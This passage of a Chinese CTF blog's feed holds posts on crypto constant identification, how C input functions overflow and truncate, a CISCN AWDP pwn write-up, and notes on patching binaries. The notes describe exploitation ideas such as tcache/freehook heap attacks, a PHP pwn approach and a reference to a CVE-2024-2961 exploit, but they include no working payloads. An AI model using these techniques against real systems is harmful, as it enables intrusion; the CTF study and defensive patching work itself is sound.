class="number">32</span>):  <span class="comment"># 进行32次迭代加密</span></span><br><span class="line">        l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="built_in">sum</span> += DELTA</span><br><span class="line">        r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = DELTA * <span class="number">32</span>  <span class="comment"># 32次迭代累加后delta的值</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="built_in">sum</span> -= DELTA</span><br><span class="line">        l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">key1 = [<span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0x78591fad</span>]</span><br><span class="line">key2 = [<span class="number">0x78591fad</span>, <span class="number">0x6dbcc2bc</span>, <span class="number">0xa3eeb7be</span>, <span class="number">0x50e7de9a</span>]</span><br><span class="line">v1 = [<span class="number">0x556E2853</span>, <span class="number">0x4393DF16</span>]</span><br><span class="line">v2 = [<span class="number">0x1989FB2B</span>, <span class="number">0x83F5A243</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">encrypted_v1 = tea_encrypt(v1, key1)</span><br><span class="line">encrypted_v2 = tea_encrypt(v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v1: <span class="subst">&#123;encrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted v2: <span class="subst">&#123;encrypted_v2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_v1 = tea_decrypt(encrypted_v1, key1)</span><br><span class="line">decrypted_v2 = tea_decrypt(encrypted_v2, key2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v1: <span class="subst">&#123;decrypted_v1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted v2: <span class="subst">&#123;decrypted_v2&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>MD5</h1><h2 id="识别-4">识别</h2><p>128位散列值，需要一个context结构体，分三步，init，updatestring和final</p><p>其中init过程会将context初始化为4个固定的magic_number:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span> <span class="params">(MD5_CTX *context)</span></span><br><span class="line"><span class="comment">/*context*/</span></span><br><span class="line">&#123;</span><br><span class="line">    context-&gt;count[<span class="number">0</span>] = context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* Load magic initialization constants. */</span></span><br><span class="line">    context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">    context-&gt;state[<span class="number">1</span>] = <span class="number">0xefcdab89</span>;</span><br><span class="line">    context-&gt;state[<span class="number">2</span>] = <span class="number">0x98badcfe</span>;</span><br><span class="line">    context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO-5">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要计算哈希值的字符串</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 MD5 哈希对象</span></span><br><span class="line">md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新哈希对象</span></span><br><span class="line">md5_hash.update(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取十六进制的哈希值</span></span><br><span class="line">hash_value = md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 Hash: <span class="subst">&#123;hash_value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考自 &lt;a href=&quot;https://www.cnblogs.com/Moomin/p/15004170.html#aes&quot;&gt;https://www.cnblogs.com/Moomin/p/15004170.html#aes&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="逆向" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>简短的IO函数特性整理——受scanf启发</title>
    <link href="https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/"/>
    <id>https://zjw1nd.github.io/2025/03/11/%E7%AE%80%E7%9F%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%95%B4%E7%90%86%E2%80%94%E2%80%94%E5%8F%97scanf%E5%90%AF%E5%8F%91/</id>
    <published>2025-03-11T12:50:37.000Z</published>
    <updated>2025-03-17T14:28:27.890Z</updated>
    
    <content type="html"><![CDATA[<p>来源于互联网而非自己手动调试，供参考，是否真实一试便知，仅供备忘。</p><h1>输入</h1><h1>gets(buf)</h1><ul class="lvl-0"><li class="lvl-2">是否能溢出：不检查长度，任意溢出</li><li class="lvl-2">截断要求：换行截断(\n,\x0a)和EOF截断。换行符会被丢弃。其他空白字符均会原本输入。</li><li class="lvl-2">其他处理：结尾自动添加\x00</li></ul><h1>read(0,buf,cnt)</h1><p>作为一个系统调用，和其他的输入函数确实有本质区别。</p><ul class="lvl-0"><li class="lvl-2"><p>是否能溢出：参数3有长度限制，不合理时可能导致溢出。</p></li><li class="lvl-2"><p>截断要求：没有截断字符，读够缓冲区数据或cnt字节后立刻返回。其中终端默认规范下回车会导致提交，结果中会包含有\n存在。默认情况下read在没有可用数据时会阻塞。</p></li></ul><p>可以说是最通用的，直接在pwntools中调用send就可以无损发送数据。</p><h1>scanf</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/121308367">参考文章</a><br>scanf的输入方式取决于其格式化占位符。我们下面重点关注存在溢出的%s</p><ul class="lvl-0"><li class="lvl-2"><p>是否能溢出：取决于格式化字符串。其中’%s’并不检查输入长度，数字</p></li><li class="lvl-2"><p>截断要求：注意，scanf由空格区分不同的格式化参数，**即scanf(‘%s’)是空格(\x20)截断的。**另外反直觉的是，scanf(‘%s’)没有0截断。</p></li></ul><h1>puts</h1><ul class="lvl-0"><li class="lvl-2"><p>末尾自动额外添加换行’\n’</p></li><li class="lvl-2"><p>0截断</p></li></ul><h1>printf</h1><p>和scanf类似，输出方式取决于格式化字符串fmt参数的设置。我们这里不谈格式化字符串的漏洞</p><ul class="lvl-0"><li class="lvl-2"><p>%s就是输出字符串</p></li></ul><h1>write</h1><p>写入文件描述符，我们重点关注write(1,buf,cnt)</p><ul class="lvl-0"><li class="lvl-2"><p>没有任何截断或换行，单纯打印到标准输出流。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来源于互联网而非自己手动调试，供参考，是否真实一试便知，仅供备忘。&lt;/p&gt;
&lt;h1&gt;输入&lt;/h1&gt;
&lt;h1&gt;gets(buf)&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;是否能溢出：不检查长度，任意溢出&lt;/li&gt;
&lt;li class</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="basic" scheme="https://zjw1nd.github.io/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscn决赛awdp复现思路</title>
    <link href="https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://zjw1nd.github.io/2025/03/10/2023ciscn%E5%86%B3%E8%B5%9Bawdp%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2025-03-10T12:16:09.000Z</published>
    <updated>2025-03-11T12:47:01.248Z</updated>
    
    <content type="html"><![CDATA[<h1>CarManager</h1><p>难点在于数据结构套数据结构，频繁的进行混乱的写入和释放，检查是否出现UAF和溢出比较浪费时间，赛场上估计很容易漏。分为用户-car-comment三套东西的菜单，每个都能删改查并且代码风格不统一。</p><p>最显眼的是一个格式化字符串漏洞，但是利用需要过一个challenge，开始看不懂以为是什么简单的对称加密，搜的题的wp也没有这个部分，结果给ai说是个数独，笑了。</p><p>第二显眼的是malloc参数取决于用户输入</p><p>wp说的UAF觉得是false positive了，堆溢出确实隐蔽，是一个strlen确定size的时候导致的，如果chunk写满了会让strlen变大？可以做溢出</p><h1>codelog</h1><p>到处是这种输入谁能保准没问题啊，老老实实read不好吗…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">sub_401536</span><span class="params">(_BYTE *a1, <span class="type">ssize_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a2--;</span><br><span class="line">    LOBYTE(v2) = v2 != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = read(<span class="number">0</span>, a1, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *__errno_location() != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v2) = *__errno_location();</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)v2 != <span class="number">4</span> )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v2) = (_BYTE)a1;</span><br><span class="line">        *a1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      &#125;</span><br><span class="line">      ++a1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假的shell，支持9个操作这个程序的sb地方在于似乎逆向存在问题，局部参数在函数内部直接用rbp+0x10和rbp+0x18访问，而64位中间的那些寄存器参数全部弃用了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004029FF loc_4029FF:                             ; CODE XREF: main+C7↑j</span><br><span class="line">.text:00000000004029FF                                         ; DATA XREF: .rodata:jpt_4029FC↓o</span><br><span class="line">.text:00000000004029FF                 lea     rax, [rbp+var_70] ; jumptable 00000000004029FC case 0</span><br><span class="line">.text:0000000000402A03                 push    [rbp+var_28]</span><br><span class="line">.text:0000000000402A06                 push    [rbp+var_30]</span><br><span class="line">.text:0000000000402A09                 push    [rbp+var_38]</span><br><span class="line">.text:0000000000402A0C                 push    [rbp+var_40]</span><br><span class="line">.text:0000000000402A0F                 mov     rdi, rax</span><br><span class="line">.text:0000000000402A12                 call    sub_401C2E</span><br></pre></td></tr></table></figure><p>有病是吧</p><p>已出，题目花里胡哨，但是事实上malloc和free的地方很少，这就带来了一个好处，即我们确定溢出点后，只需要跟踪所有可能的分配和释放就行了，完全不要去逆向程序到底在干嘛（说实话数据结构极其混乱）</p><p>定好溢出点之后就在这里打断点，然后用所有其他的东西去给这个溢出点做堆风水，打tcache写freehook一把梭。另外，scanf(%s)出乎意料的能输入\x00，反而会被空格(\x20)截断。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CarManager&lt;/h1&gt;
&lt;p&gt;难点在于数据结构套数据结构，频繁的进行混乱的写入和释放，检查是否出现UAF和溢出比较浪费时间，赛场上估计很容易漏。分为用户-car-comment三套东西的菜单，每个都能删改查并且代码风格不统一。&lt;/p&gt;
&lt;p&gt;最显眼的是一个格式化字</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Awdp-PWN准备技巧</title>
    <link href="https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/"/>
    <id>https://zjw1nd.github.io/2025/02/25/Awdp-PWN%E5%87%86%E5%A4%87%E6%8A%80%E5%B7%A7/</id>
    <published>2025-02-25T11:40:53.000Z</published>
    <updated>2025-03-17T14:14:23.956Z</updated>
    
    <content type="html"><![CDATA[<h1>环境问题</h1><p>首先，我有两套环境。一个windows一个arch，都是物理机。</p><p>其中，windows上拥有kali-wsl和win_penetration_toolkit-vmware，平常的pwn题是采用</p><ul class="lvl-0"><li class="lvl-2"><p>wsl-kali执行python脚本/gdb调试，patchelf+glibc-all-in-one，windows主机ida分析</p></li></ul><p>缺点是，windows上没有docker。做不了内核题。优点是，windows上具有渗透测试的虚拟机，可以说渗透基本上必须用win（blackarch开发不是很全）</p><p>而linux环境上也有原生ida支持，也能做，缺点在于没有杂七杂八的工具比如anytxt，localsend这种，也缺misc工具，以及渗透的工具。</p><p>linux准备好ubuntu的三个docker，都安装gdb？</p><h2 id="pwn题配置">pwn题配置</h2><p>参考自<a href="https://blog.csdn.net/qq_38154820/article/details/119259414">文章1</a></p><p><a href="https://xz.aliyun.com/news/13321?time__1311=eqUxuDcDBGe7qRxBqDwjDAh%2BO3phwBbD&amp;u_atoken=9d921b0c0075e2df58d83b37a58c5b31&amp;u_asig=0a47315217404858836656288e003d">文章2(包括流量转发，批量攻击脚本)</a></p><h1>准备</h1><p>手动patch，使用ida keypatch即可。打包命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -rvf archive.tar newfile</span><br><span class="line"></span><br><span class="line">tar -xvf archive.tar</span><br><span class="line">tar -zcvf update.tar.gz update.sh pwn_fix</span><br></pre></td></tr></table></figure><h1>常见漏洞的patch方法</h1><h2 id="格式化字符串漏洞">格式化字符串漏洞</h2><ol><li class="lvl-3"><p>printf=&gt;puts,直接改call的地址即可。风险是puts会在结尾添加换行，不一定能过检查。</p></li><li class="lvl-3"><p>强行调整参数。rdi放&quot;%s&quot;，rsi放原参数。程序里有%s在的话会好一点，如果没有%s的话，我们可能要找3字节塞进去如下内容：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x25 0x73 0x00== %s\0</span><br></pre></td></tr></table></figure><p>但是指令也可能不够长？</p><h2 id="UAF">UAF</h2><blockquote><p>“UAF就直接把free nop掉” ——某位大跌学长</p></blockquote><p>check过程中没办法检查是否有free，所以直接nop掉free似乎是个不错的方案。反正也爆不了，内存就在那扔着你也不能怎么样</p><h2 id="整数溢出">整数溢出</h2><p>整数溢出比较简单，修改相应判断指令的跳转逻辑就行（？）将有符号跳转改为无符号？</p><h2 id="缓冲区溢出">缓冲区溢出</h2><p>改小相关的输入长度,分x86和x64，写死的数值参数x86需要patch push指令，但是注意，在操作数大于0x100的时候push内容可能会变化，涉及到栈平衡的问题需要注意。<br>x64就直接patch寄存器赋值即可。</p><p>scanf的话尝试将&quot;%s&quot;改成&quot;%ns&quot;来限制输入长度，如果长度是动态的尝试了下改成read(0,buf,len)一般汇编也是够的</p><h2 id="VM">VM</h2><p>核心是防止在vm指令执行过程中越界/非预期的读写，具体问题具体分析，肯定会有执行指令过程中的check漏洞</p><h2 id="逻辑漏洞">逻辑漏洞</h2><p>nop漏洞分支（nop掉跳转指令）敏感函数的参数权限（如mmap等）</p><h2 id="通防">通防</h2><p>给程序加沙箱直接无脑关闭execve调用，但是通防可能被检测，自行斟酌<br><a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></p><p>测试下来，二进制文件大小没有变化，线下试试吧。</p><p>或者还有一招，如果程序设置了alarm(xx)的话（一般会有alarm(60)）这种限制时间的，测试下之后把它改的很小让exp利用不完，也能行。</p><h2 id="非预期？">非预期？</h2><p>程序如果exit退出，打io的话尝试nop掉exit或者改成_exit？</p><h1>检查漏洞</h1><p>敏感功能函数，strlen获取长度限制能不能塞满溢出，scanf%s的输入</p><h1>docker命令</h1><p>pwn调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID # auto update 自动执行update.sh脚本</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID /bin/sh # do not update 不会自动更新</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID # privileged enabled and auto update 给特权标志和自动更新</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID /bin/sh # privileged enabled and auto update 给特权标志和自动更新</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -d -v $PWD:/home/ctf/hacker</span><br><span class="line"></span><br><span class="line">docker exec -it CONTAINER_ID /bin/sh</span><br><span class="line">docker exec -it -u root CONTAINER_ID /bin/sh</span><br><span class="line"></span><br><span class="line">/bin/test-this-container.sh</span><br></pre></td></tr></table></figure><p>用官方镜像启动本地环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i xxx.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a --no-trunc 输出所有命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>PHP PWN???</h1><blockquote><p>2025.3.17: 事实上根本就没工夫看这题…</p></blockquote><p>赛前发的附件名字叫php-master怀疑要出php-pwn了，搜了下结果还挺常见的但是都没做过，麻。先速通一下fix？</p><p>PHP pwn的核心是一个C编写的扩展动态库，为php提供一些可用的函数。</p><h2 id="环境搭建">环境搭建</h2><p>php的版本也比较多，准备8.1-8.3的docker和本机的8.4.4，以及7.4备用</p><p>实际操作时，去对应docker下将/usr/src的源码解压。找到源码目录的ext，ext_skel.php，这个脚本可以自动生成一套扩展用的基础文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">创建容器: docker run -itd --name php -p 80:80 -v /Users/xiaosheng/docker:/var/www/html -v /Users/xiaosheng/docker/etc:/usr/local/etc -v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled php:apache-buster</span><br><span class="line">命令详解:</span><br><span class="line">--name php: php 表示创建出来的镜像名称</span><br><span class="line">-p 80:80: 表示本机的 80 端口映射到容器内的 80 端口, 其中第一个 80 是本机的</span><br><span class="line">-v /Users/xiaosheng/docker:/var/www/html: 数据卷挂载, 将本机的代码文件夹映射到容器内的代码文件夹, 冒号前面的是本机的文件夹地址</span><br><span class="line">-v /Users/xiaosheng/docker/etc:/usr/local/etc: 将容器内 PHP 的配置文件映射到本机, 这样方便修改配置文件, 冒号前面的是本地的文件夹地址</span><br><span class="line">-v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled: 将容器内 Apache 站点的配置文件映射到本地, 方便添加和修改站点配置文件, 冒号前面的是本地的文件夹地址</span><br><span class="line">php:apache-buster: 表示的是使用哪个镜像来创建容器, 即 镜像名称:tag名称、</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">容器中 PHP 没有 MySQL 的扩展, 所以需要自己手动下载, 下载步骤可以参考该链接 https://www.yoyoask.com/?p=122</span><br><span class="line">docker-php-source : 在 /usr/src 目录下创建出来 php 文件夹</span><br><span class="line">进入 /usr/src/php/ext 文件夹, 使用 docker-php-ext-install 安装所需要的扩展, 如安装 pdo-mysql 扩展, 可以使用 docker-php-ext-install pdo_mysql 来安装</span><br><span class="line">修改 PHP 的配置文件</span><br><span class="line">去掉 ;extension=pdo_mysql 前面的 ;</span><br><span class="line">使用 docker restart 容器ID 来重启容器</span><br></pre></td></tr></table></figure><p>php的核心配置文件在php.ini 执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini</span><br></pre></td></tr></table></figure><p>命令来输出所有的配置文件位置</p><h2 id="思路">思路</h2><p>首先，直接读/proc/self/map来拿地址，不多bb</p><p>然后php堆类似于linux内核的slab，没有复杂的metadata，而是通通用bucket管理，空闲链表也是类似tcache直接fd连接有UAF的话随便改。</p><p>fix的话可以考虑nop掉efree</p><h2 id="逆向结构体">逆向结构体</h2><p>module_entry:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">struct  _zend_module_entry &#123;</span><br><span class="line">                        unsigned short size;</span><br><span class="line">unsigned int zend_api;</span><br><span class="line">unsigned char zend_debug;</span><br><span class="line">unsigned char zts;</span><br><span class="line">void *ini_entry;</span><br><span class="line">void *deps;</span><br><span class="line">const char *name;</span><br><span class="line">void* functions;</span><br><span class="line">void* module_start_up_func</span><br><span class="line">void* module_shutdown_func;</span><br><span class="line">void* request_startup_func;</span><br><span class="line">void* request_shutdown_func;</span><br><span class="line">void *info_func;</span><br><span class="line">const char *version;</span><br><span class="line">size_t globals_size;</span><br><span class="line">void* globals_id_ptr;</span><br><span class="line">void* globals_ptr;</span><br><span class="line">void* globals_ctor;</span><br><span class="line">void* globals_dtor;</span><br><span class="line">void* post_deactivate_func;</span><br><span class="line">int module_started;</span><br><span class="line">unsigned char type;</span><br><span class="line">void* handle;</span><br><span class="line">int module_number;</span><br><span class="line">const char *build_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6:str<br>7:arr<br>4:int?</p><h2 id="patch">patch</h2><p>off by null(D^3CTF 2024 pwnshell)</p><h2 id="非预期">非预期</h2><p>cve-2024-2961，借助libc的溢出从文件包含提升至命令执行。现成exp环境配好了，搜到的去年决赛pwn的awdp中php可以用这个一键打通，万一呢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;环境问题&lt;/h1&gt;
&lt;p&gt;首先，我有两套环境。一个windows一个arch，都是物理机。&lt;/p&gt;
&lt;p&gt;其中，windows上拥有kali-wsl和win_penetration_toolkit-vmware，平常的pwn题是采用&lt;/p&gt;
&lt;ul class=&quot;lvl-</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="awd" scheme="https://zjw1nd.github.io/tags/awd/"/>
    
    <category term="php" scheme="https://zjw1nd.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Arch安装备忘手册</title>
    <link href="https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/"/>
    <id>https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/</id>
    <published>2025-02-24T08:30:11.000Z</published>
    <updated>2025-03-11T12:44:09.964Z</updated>
    
